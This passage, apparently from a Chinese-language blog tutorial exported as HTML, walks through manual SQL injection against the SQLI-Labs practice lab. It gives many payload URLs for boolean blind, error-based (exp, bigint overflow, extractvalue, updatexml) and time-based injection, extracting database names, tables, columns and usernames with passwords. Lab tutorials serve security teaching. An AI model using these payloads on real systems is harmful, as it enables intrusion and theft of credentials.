src=\"/images/sqlall/bool21.jpg\" alt=\"bool21\"></p>\n<p>如果列数量不对时会报错;</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-5/?id=1<span class=\"string\">&#x27; union select (exp(~(select * FROM(SELECT USER())a))),3--+</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-2-1-爆库\"><a href=\"#2-2-1-爆库\" class=\"headerlink\" title=\"2.2.1.爆库\"></a>2.2.1.爆库</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">第一个数据库:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-5/?id=1<span class=\"string\">&#x27; union select (exp(~(select * FROM(SELECT schema_name from</span></span><br><span class=\"line\"><span class=\"string\">information_schema.schemata limit 0,1)a))),2,3--+</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sqlall/bool23.jpg\" alt=\"bool23\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">第二个数据库:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-5/?id=1<span class=\"string\">&#x27; union select (exp(~(select * FROM(SELECT schema_name from</span></span><br><span class=\"line\"><span class=\"string\">information_schema.schemata limit 1,1)a))),2,3--+</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-2-2-爆表\"><a href=\"#2-2-2-爆表\" class=\"headerlink\" title=\"2.2.2.爆表\"></a>2.2.2.爆表</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">第一张表:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-5/?id=1<span class=\"string\">&#x27; union select (exp(~(select * FROM(SELECT table_name from</span></span><br><span class=\"line\"><span class=\"string\">information_schema.tables where table_schema=&#x27;</span>security<span class=\"string\">&#x27; limit 0,1)a))),2,3--+</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sqlall/bool24.jpg\" alt=\"bool24\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">第三张表:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-5/?id=1<span class=\"string\">&#x27; union select (exp(~(select * FROM(SELECT table_name from</span></span><br><span class=\"line\"><span class=\"string\">information_schema.tables where table_schema=&#x27;</span>security<span class=\"string\">&#x27; limit 2,1)a))),2,3--+</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-2-3-爆字段\"><a href=\"#2-2-3-爆字段\" class=\"headerlink\" title=\"2.2.3.爆字段\"></a>2.2.3.爆字段</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">第一个字段名:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-5/?id=1<span class=\"string\">&#x27; union select (exp(~(select * FROM(SELECT column_name from</span></span><br><span class=\"line\"><span class=\"string\">information_schema.columns where table_name=&#x27;</span>users<span class=\"string\">&#x27; limit 0,1)a))),2,3--+</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-2-4-爆数据\"><a href=\"#2-2-4-爆数据\" class=\"headerlink\" title=\"2.2.4.爆数据\"></a>2.2.4.爆数据</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">第一列数据:注意：这里只是爆出username列;</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; union select (exp(~(select * FROM(SELECT username from security.users limit</span></span><br><span class=\"line\"><span class=\"string\">0,1)a))),2,3 --+</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sqlall/bool26.jpg\" alt=\"bool26\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; union select (exp(~(select * FROM(SELECT username from security.users limit</span></span><br><span class=\"line\"><span class=\"string\">1,1)a))),2,3 --+</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-2-5-爆两列数据\"><a href=\"#2-2-5-爆两列数据\" class=\"headerlink\" title=\"2.2.5.爆两列数据\"></a>2.2.5.爆两列数据</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; union select (exp(~(select * FROM(SELECT distinct</span></span><br><span class=\"line\"><span class=\"string\">concat(0x3a,username,0x3a,password) from security.users limit 0,1)a))),2,3 --+</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sqlall/bool27.jpg\" alt=\"bool27\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; union select (exp(~(select * FROM(SELECT distinct</span></span><br><span class=\"line\"><span class=\"string\">concat(0x3a,username,0x3a,password) from security.users limit 1,1)a))),2,3 --+</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"2-3-bigint溢出\"><a href=\"#2-3-bigint溢出\" class=\"headerlink\" title=\"2.3.bigint溢出\"></a>2.3.bigint溢出</h2><p>具体产生原理可以阅读《mysql注入之bigint溢出报错注入》其中已经介绍完备;</p>\n<h3 id=\"2-3-1-爆库\"><a href=\"#2-3-1-爆库\" class=\"headerlink\" title=\"2.3.1.爆库\"></a>2.3.1.爆库</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; union select (!(select * from (select schema_name from</span></span><br><span class=\"line\"><span class=\"string\">information_schema.schemata limit 0,1)x) - ~0),2,3--+</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sqlall/bool29.jpg\" alt=\"bool29\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; union select (!(select * from (select schema_name from</span></span><br><span class=\"line\"><span class=\"string\">information_schema.schemata limit 6,1)x) - ~0),2,3--+</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-3-2-爆表\"><a href=\"#2-3-2-爆表\" class=\"headerlink\" title=\"2.3.2.爆表\"></a>2.3.2.爆表</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; union select (!(select * from (select table_name from information_schema.tables</span></span><br><span class=\"line\"><span class=\"string\">where table_schema=&#x27;security&#x27; limit 0,1)x) - ~0),2,3--+</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sqlall/bool30.jpg\" alt=\"bool30\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; union select (!(select * from (select table_name from information_schema.tables</span></span><br><span class=\"line\"><span class=\"string\">where table_schema=&#x27;security&#x27; limit 1,1)x) - ~0),2,3--+</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-3-3-爆字段\"><a href=\"#2-3-3-爆字段\" class=\"headerlink\" title=\"2.3.3.爆字段\"></a>2.3.3.爆字段</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; union select (!(select * from (select column_name from information_schema.columns</span></span><br><span class=\"line\"><span class=\"string\">where table_name=&#x27;users&#x27; limit 0,1)x) - ~0),2,3--+</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sqlall/bool31.jpg\" alt=\"bool31\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; union select (!(select * from (select column_name from information_schema.columns</span></span><br><span class=\"line\"><span class=\"string\">where table_name=&#x27;users&#x27; limit 1,1)x) - ~0),2,3--+</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-3-4-爆数据\"><a href=\"#2-3-4-爆数据\" class=\"headerlink\" title=\"2.3.4.爆数据\"></a>2.3.4.爆数据</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; union select (!(select * from (select username from security.users limit 0,1)x) -</span></span><br><span class=\"line\"><span class=\"string\">~0),2,3--+</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sqlall/bool32.jpg\" alt=\"bool32\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; union select (!(select * from (select username from security.users limit 1,1)x) -</span></span><br><span class=\"line\"><span class=\"string\">~0),2,3--+</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"2-4-Xpath报错注入\"><a href=\"#2-4-Xpath报错注入\" class=\"headerlink\" title=\"2.4.Xpath报错注入\"></a>2.4.Xpath报错注入</h2><p>主要的是extractvalue函数只要两个参数哦,updatexml是3个,所以在进行构造语句时需要注意.</p>\n<h3 id=\"2-4-1-Xpath注入之extractvalue\"><a href=\"#2-4-1-Xpath注入之extractvalue\" class=\"headerlink\" title=\"2.4.1.Xpath注入之extractvalue()\"></a>2.4.1.Xpath注入之extractvalue()</h3><p>mysql&gt; select extractvalue(1,concat(0x7e,(select database()),0x7e));</p>\n<h4 id=\"2-4-1-1-爆库\"><a href=\"#2-4-1-1-爆库\" class=\"headerlink\" title=\"2.4.1.1.爆库\"></a>2.4.1.1.爆库</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1” and extractvalue(1,concat(0x7e,(select database()),0x7e))--+</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sqlall/bool34.jpg\" alt=\"bool34\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; and extractvalue(1,concat(0x7e,(select user()),0x7e))--+</span></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"2-4-1-2-爆表\"><a href=\"#2-4-1-2-爆表\" class=\"headerlink\" title=\"2.4.1.2.爆表\"></a>2.4.1.2.爆表</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables</span></span><br><span class=\"line\"><span class=\"string\">where table_schema=&#x27;security&#x27; limit 0,1),0x7e))--+</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sqlall/bool36.jpg\" alt=\"bool36\"></p>\n<h4 id=\"2-4-1-3-爆字段\"><a href=\"#2-4-1-3-爆字段\" class=\"headerlink\" title=\"2.4.1.3.爆字段\"></a>2.4.1.3.爆字段</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; and extractvalue(1,concat(0x7e,(select column_name from</span></span><br><span class=\"line\"><span class=\"string\">information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),0x7e))--+</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sqlall/bool37.jpg\" alt=\"bool37\"></p>\n<h4 id=\"2-4-1-6-爆数据\"><a href=\"#2-4-1-6-爆数据\" class=\"headerlink\" title=\"2.4.1.6.爆数据\"></a>2.4.1.6.爆数据</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; and extractvalue(1,concat(0x7e,(select username from security.users limit</span></span><br><span class=\"line\"><span class=\"string\">0,1),0x7e))--+</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sqlall/bool38.jpg\" alt=\"bool38\"></p>\n<h3 id=\"2-4-2-Xpath注入之updatexml\"><a href=\"#2-4-2-Xpath注入之updatexml\" class=\"headerlink\" title=\"2.4.2.Xpath注入之updatexml()\"></a>2.4.2.Xpath注入之updatexml()</h3><h4 id=\"2-4-2-1-爆库\"><a href=\"#2-4-2-1-爆库\" class=\"headerlink\" title=\"2.4.2.1.爆库\"></a>2.4.2.1.爆库</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sqlall/bool40.jpg\" alt=\"bool40\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; and updatexml(1,concat(0x7e,(select user()),0x7e),1)--+</span></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"2-4-2-3-爆表\"><a href=\"#2-4-2-3-爆表\" class=\"headerlink\" title=\"2.4.2.3.爆表\"></a>2.4.2.3.爆表</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables</span></span><br><span class=\"line\"><span class=\"string\">where table_schema=&#x27;security&#x27; limit 0,1),0x7e),1)--+</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sqlall/bool41.jpg\" alt=\"bool41\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables</span></span><br><span class=\"line\"><span class=\"string\">where table_schema=&#x27;security&#x27; limit 1,1),0x7e),1)--+</span></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"2-4-2-4-爆字段\"><a href=\"#2-4-2-4-爆字段\" class=\"headerlink\" title=\"2.4.2.4.爆字段\"></a>2.4.2.4.爆字段</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns</span></span><br><span class=\"line\"><span class=\"string\">where table_name=&#x27;users&#x27; limit 0,1),0x7e),1)--+</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sqlall/bool42.jpg\" alt=\"bool42\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns</span></span><br><span class=\"line\"><span class=\"string\">where table_name=&#x27;users&#x27; limit 1,1),0x7e),1)--+</span></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"2-4-2-5-爆数据\"><a href=\"#2-4-2-5-爆数据\" class=\"headerlink\" title=\"2.4.2.5.爆数据\"></a>2.4.2.5.爆数据</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; and updatexml(1,concat(0x7e,(select username from security.users limit</span></span><br><span class=\"line\"><span class=\"string\">0,1),0x7e),1)--+</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sqlall/bool43.jpg\" alt=\"bool43\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; and updatexml(1,concat(0x7e,(select username from security.users limit </span></span><br><span class=\"line\"><span class=\"string\">1,1),0x7e),1)--+</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"三、时间盲注\"><a href=\"#三、时间盲注\" class=\"headerlink\" title=\"三、时间盲注\"></a>三、时间盲注</h1><p>时间盲注会称为延时注入,利用页面反回结果所用时间来判断注入是否存在和后期注入进行;<br>延时注入是主要针对页面请求时间变化,无法用布尔真假判断、无法报错的情况下的注入技术.<br>延时注入作为最精准的注入,但是缺点明显——耗时长要想利用延时注.<br>延迟注入常见函数：<br>sleep() //延时<br>if(condition,true,false) //条件语句<br>ascii()=ascii码 //转换成ascii码<br>substr(“string”,strart,length) //mid()也一样，取出字符串里的第几位开始，长度多少的字符.<br>原理： 延时注入的原理就是，所要爆的信息的ascii码正确时,产生延时,否则不延时。实例如下所示</p>\n<p><img src=\"/images/sqlall/bool45.jpg\" alt=\"bool45\"></p>\n<p>解析：<br>0、mysql&gt; select if(ascii(substr((select schema_name from information_schema.schemata limit 0,1),1,1))=105,sleep(5),1);<br>1、select schema_name from information_schema.schemata limit 0,1 //取出数据库中第一个数据库,<br>2、substr(‘string’,1,1) //取出字符串,从第一个字符开始,长度为1,也就是第一个字母/字符<br>3、ascii(substr())=ascii码 //对字母/字符进行ascii编码并比较;<br>4、if(step1,1,sleep(5)) //如果第一个ascii编码的条件正确,会执行sleep()出现延时几秒,如果条件错误,则会在结果中输出1,可以看到上图的执行结果;<br>总结:可以再结合报错注入去猜解服务中数据库、表等信息;当然，延时注入也有不足之处太麻烦,但是较为准确基本能够确定字符;</p>\n<h2 id=\"3-1-时间盲注实战\"><a href=\"#3-1-时间盲注实战\" class=\"headerlink\" title=\"3.1.时间盲注实战\"></a>3.1.时间盲注实战</h2><p>这里采用Sqli-Labs中Less-10的实验来实战测试,为了更能体现出效果所以在延迟注入时,浏览器出现加载信息时出现延迟加载现象,或可以使用Burpsuite工具.</p>\n<h3 id=\"3-1-1-访问Less-10\"><a href=\"#3-1-1-访问Less-10\" class=\"headerlink\" title=\"3.1.1.访问Less-10\"></a>3.1.1.访问Less-10</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-10/?id=1</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sqlall/bool46.jpg\" alt=\"bool46\"></p>\n<h4 id=\"3-1-2-尝试双引号测试注入\"><a href=\"#3-1-2-尝试双引号测试注入\" class=\"headerlink\" title=\"3.1.2.尝试双引号测试注入\"></a>3.1.2.尝试双引号测试注入</h4><p>URL:浏览器出现延时,注意网络稳定性,不然会出现混淆;</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://sqli-labs.me:8888/Less-10/?id=1<span class=\"string\">&quot; and sleep(5)--+</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sqlall/bool47.jpg\" alt=\"bool47\"></p>\n<h4 id=\"3-1-3-爆库\"><a href=\"#3-1-3-爆库\" class=\"headerlink\" title=\"3.1.3.爆库\"></a>3.1.3.爆库</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL：115—&gt;s</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-10/?id=1<span class=\"string\">&quot; and if(ord(mid(database(),1,1))=115,sleep(5),1)--+</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sqlall/bool48.jpg\" alt=\"bool48\"></p>\n<h4 id=\"3-1-5-爆表\"><a href=\"#3-1-5-爆表\" class=\"headerlink\" title=\"3.1.5.爆表\"></a>3.1.5.爆表</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL：101—&gt;e</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-10/?id=1<span class=\"string\">&quot; and if(ord(mid((select table_name from information_schema.tables where</span></span><br><span class=\"line\"><span class=\"string\">table_schema=&#x27;security&#x27; limit 0,1),1,1))=101,sleep(5),1)--+</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sqlall/bool50.jpg\" alt=\"bool50\"></p>\n<h4 id=\"3-1-6-爆字段\"><a href=\"#3-1-6-爆字段\" class=\"headerlink\" title=\"3.1.6.爆字段\"></a>3.1.6.爆字段</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL：105—&gt;i</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-10/?id=1<span class=\"string\">&quot; and if(ord(mid((select column_name from information_schema.columns where</span></span><br><span class=\"line\"><span class=\"string\">table_name=&#x27;users&#x27; limit 0,1),1,1))=105,sleep(5),1)--+</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sqlall/bool51.jpg\" alt=\"bool51\"></p>\n<h4 id=\"3-1-7-爆数据\"><a href=\"#3-1-7-爆数据\" class=\"headerlink\" title=\"3.1.7.爆数据\"></a>3.1.7.爆数据</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URl:68—&gt;D</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-10/?id=1<span class=\"string\">&quot; and if(ord(mid((select username from security.users limit</span></span><br><span class=\"line\"><span class=\"string\">0,1),1,1))=68,sleep(5),1)--+</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sqlall/bool52.jpg\" alt=\"bool52\"></p>\n<p>其他字段信息请自行搭建环境测试,</p>\n","site":{"data":{}},"excerpt":"","more":"<p>Tip: 这篇将详细介绍盲注/报错/时间延迟注入等三种注入,并在测试环境SQLI-Labs中实现注入;这里说下,<a href=\"https://github.com/Audi-1/sqli-labs\">SQLI-Labs</a>相比大家都知道其内部实验主要关注SQL注入,且分类众多,对于想学习手工注入、SQL注入可以本地搭建环境进行测试.</p>\n<table>\n<thead>\n<tr>\n<th>一、布尔盲注</th>\n<th>二、报错注入</th>\n<th>三、时间盲注</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>left()函数</td>\n<td>count()&amp;floor(rand())&amp;group by</td>\n<td>sleep()函数</td>\n</tr>\n<tr>\n<td>ascii()和substr函数</td>\n<td>EXP()函数</td>\n<td>if(condition,true,false)</td>\n</tr>\n<tr>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>ord()函数&amp;mid()函数</td>\n<td>bigint溢出</td>\n<td></td>\n</tr>\n<tr>\n<td>regexp正则</td>\n<td>xpath报错注入:extractvalue()、updataxml()</td>\n<td></td>\n</tr>\n</tbody></table>\n<h1 id=\"一、布尔盲注\"><a href=\"#一、布尔盲注\" class=\"headerlink\" title=\"一、布尔盲注\"></a>一、布尔盲注</h1><h2 id=\"1-1-left\"><a href=\"#1-1-left\" class=\"headerlink\" title=\"1.1.left()\"></a>1.1.left()</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">格式:left(str,1)&gt;5</span><br></pre></td></tr></table></figure>\n<p>解析:str是字符串,可能是版本号,可能是数据库名等;数字1:指的是从字符串中获取第一个字符,如果想获取第二个字符,直接修改次数字就行,但,注意:后面比较的数字要写上我们探测的第一个字符信息.</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">示例:</span><br><span class=\"line\">Database()=<span class=\"string\">&#x27;security&#x27;</span>实际值;</span><br><span class=\"line\">Left(database(),1)&gt;<span class=\"string\">&#x27;s&#x27;</span> 没有爆错并测出第一个字符是<span class=\"string\">&#x27;s&#x27;</span></span><br><span class=\"line\">Left(database(),2)&gt;<span class=\"string\">&#x27;sh&#x27;</span> 需要加第一个字符,否则会爆错的;注意啦啦啦;</span><br></pre></td></tr></table></figure>\n<h3 id=\"1-1-1-爆库\"><a href=\"#1-1-1-爆库\" class=\"headerlink\" title=\"1.1.1.爆库\"></a>1.1.1.爆库</h3><p>1.1.1.1.猜测第一个字符</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:猜测第一个字符是否大于<span class=\"string\">&#x27;i&#x27;</span>字符</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; and left(database(),1)&gt;&#x27;i&#x27;--+</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/sqlall/bool1.jpg\" alt=\"bool1\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL:确定第一个字符是s</span><br><span class=\"line\">http://sqli-labs.me:8888/Less-6/?id=1<span class=\"string\">&quot; and 